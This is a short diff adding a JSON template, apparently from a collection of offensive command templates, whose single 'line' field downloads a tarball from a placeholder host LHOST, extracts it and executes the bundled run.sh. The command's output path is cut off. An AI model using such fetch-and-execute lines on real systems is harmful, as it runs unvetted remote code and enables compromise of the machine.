@@ -1,0 +1,6 @@
+{
+	"line": "curl -o clippy.tar.gz http://LHOST/clippy.tar.gz && tar xzvf clippy.tar.gz && cd clippy && chmod +x run.sh && ./run.sh >/dev/pts/",
+	"variables": {
+        "LHOST": "LHOST"
+	}
+}
